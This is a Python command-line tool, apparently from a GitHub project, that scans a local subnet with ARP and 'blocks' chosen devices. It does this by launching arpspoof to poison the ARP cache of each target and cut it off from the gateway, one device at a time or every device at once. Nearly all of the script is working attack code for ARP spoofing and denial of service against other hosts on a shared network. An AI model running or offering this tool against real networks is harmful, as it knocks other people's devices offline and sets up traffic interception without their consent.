#
# Github: https://github.com/fakuventuri/network_blocker
#
# This script is used to block a device on your network.
#
# Usage:
#   sudo python3 network_blocker.py
#
import os
import sys

import socket

import subprocess

from threading import Thread

from typing import List, Tuple

try:
    from scapy.all import ARP, Ether, srp
    from tabulate import tabulate
except ImportError:
    print("Required dependencies not found.")
    print("Please install the required packages with the following command:")
    print("pip install scapy tabulate")
    sys.exit(1)


def scan_network(ip_range: str) -> List[Tuple[str, str, str]]:
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(arp_req, timeout=3, verbose=False)

    device_list = []

    for _, rcv in answered:
        ip = rcv[ARP].psrc
        mac = rcv[Ether].src

        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = "Unknown"
        device_list.append((ip, mac, hostname))

    return device_list


def generate_devices_table(
    device_list: List[Tuple[str, str, str]], blocked_devices, gateway_ip: str
):
    headers = ["Index", "IP Address", "MAC Address", "Hostname", "Blocked"]
    table = [
        [
            index if device[0] != gateway_ip else "Gateway",
            device[0],
            device[1],
            device[2],
            "Yes"
            if any(process.args[-2] == device[0] for process in blocked_devices)
            else "No"
            if device[0] != gateway_ip
            else "N/A",
        ]
        for index, device in enumerate(device_list)
    ]

    return tabulate(table, headers=headers, tablefmt="grid")


def block_device(
    device: Tuple[str, str, str],
    gateway_ip: str,
    iface: str,
) -> subprocess.Popen:
    target_ip, target_mac, hostname = device

    # create the arp spoofing command
    arpspoof_cmd = ["sudo", "arpspoof", "-i", iface, "-t", target_ip, gateway_ip]

    # start the process without echoing the output
    with open(os.devnull, "w") as devnull:
        process = subprocess.Popen(
            arpspoof_cmd, stdout=devnull, stderr=devnull, start_new_session=True
        )
    # return the process
    return process


def processTerminator(blocked_devices):
    for process in blocked_devices:
        process.terminate()
        process.wait()
    print("All processes terminated.")


def print_menu():
    os.system("clear")  # clear the terminal

    print("\n#                      Welcome to Network Blocker                    #")
    print("               Script to block a device on your network                \n")
    print("                                              Developed by FakuVenturi \n")


def print_complete_menu(device_list, blocked_devices, IPAddr, gateway_ip):
    print_menu()

    print(generate_devices_table(device_list, blocked_devices, gateway_ip), "\n")

    print("Your IP Address is: ", IPAddr, "\n")

    print("Blocked devices: ", len(blocked_devices), "\n")


def main():
    print_menu()

    if os.geteuid() != 0:
        print("Please run this script with root privileges.")
        sys.exit(1)

    print("Scanning network...")

    ip_range = "192.168.1.0/24"  # the ip range to scan

    iface = (
        os.popen("ip -o -4 route show to default | awk '{print $5}'").read().strip("\n")
    )  # get the interface name and remove the trailing newline

    gateway_ip = (
        os.popen("ip -o -4 route show to default | awk '{print $3}'").read().strip("\n")
    )  # get the gateway ip and remove the trailing newline

    # get the local ip address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPAddr = s.getsockname()[0]
    s.close()

    # scan the network and get the list of devices
    device_list = scan_network(ip_range)

    blocked_devices = []

    if not device_list:
        print("No devices found.")
        sys.exit(1)

    print_complete_menu(device_list, blocked_devices, IPAddr, gateway_ip)

    print("\n")

    try:
        while True:
            try:
                # get the user's choice
                print(
                    "  Enter the index of the device to block/unblock\n  0 to block all\n -3 to unblock all\n -2 to rescan the network\n -1 to exit (Ctrl+C)\n"
                )
                choice = int(input("~> "))

                if choice == -1:
                    # exit the script
                    break
                elif choice == -2:
                    # rescan the network
                    os.system("clear")
                    print_menu()
                    print("Scanning network...")
                    device_list = scan_network(ip_range)
                    print_complete_menu(
                        device_list, blocked_devices, IPAddr, gateway_ip
                    )
                elif choice == -3:
                    # unblock all devices
                    if blocked_devices:
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )
                        print("Unblocking all devices...")
                        for process in blocked_devices:
                            process.terminate()
                            process.wait()
                        blocked_devices.clear()
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )
                    else:
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )
                        print("No devices are blocked.\n")
                elif choice == 0:
                    # block all devices
                    if len(blocked_devices) < len(device_list) - 1:
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )
                        print("Blocking all devices...")
                        for device in device_list:
                            # check if the device is the gateway and prevent it
                            if device[0] == gateway_ip:
                                continue
                            blocked_devices.append(
                                block_device(device, gateway_ip, iface)
                            )
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )
                    else:
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )
                        print("All devices are already blocked.\n")
                elif 0 < choice < len(device_list):
                    # block/unblock the selected device
                    # check if the user selected the gateway and prevent it
                    if device_list[choice][0] == gateway_ip:
                        print_complete_menu(
                            device_list, blocked_devices, IPAddr, gateway_ip
                        )

                        print("You cannot block your gateway.\n")
                        continue

                    print_complete_menu(
                        device_list, blocked_devices, IPAddr, gateway_ip
                    )
                    print("selected device: ", choice)
                    selected_device = device_list[choice]

                    if any(
                        process.args[-2] == selected_device[0]
                        for process in blocked_devices
                    ):
                        print("\nUnblocking", selected_device[0])

                        for process in blocked_devices:
                            if process.args[-2] == selected_device[0]:
                                process.terminate()
                                process.wait()
                                blocked_devices.remove(process)
                    else:
                        print("\nBlocking", selected_device[0])

                        process = block_device(selected_device, gateway_ip, iface)

                        blocked_devices.append(process)

                    print_complete_menu(
                        device_list, blocked_devices, IPAddr, gateway_ip
                    )
                else:
                    print_complete_menu(
                        device_list, blocked_devices, IPAddr, gateway_ip
                    )

                    print("Invalid choice. Please try again.\n")
            except ValueError:
                print_complete_menu(device_list, blocked_devices, IPAddr, gateway_ip)

                print("Invalid input. Please enter a number.    \n")
    except KeyboardInterrupt:
        if blocked_devices:
            print_complete_menu(device_list, blocked_devices, IPAddr, gateway_ip)
            print("Terminating all processes...\n")
            t = Thread(target=processTerminator, args=(blocked_devices,))
            t.start()
            t.join()

    finally:
        if blocked_devices:
            print_complete_menu(device_list, blocked_devices, IPAddr, gateway_ip)
            print("Terminating all processes...\n")
            t = Thread(target=processTerminator, args=(blocked_devices,))
            t.start()
            t.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nClosing...")
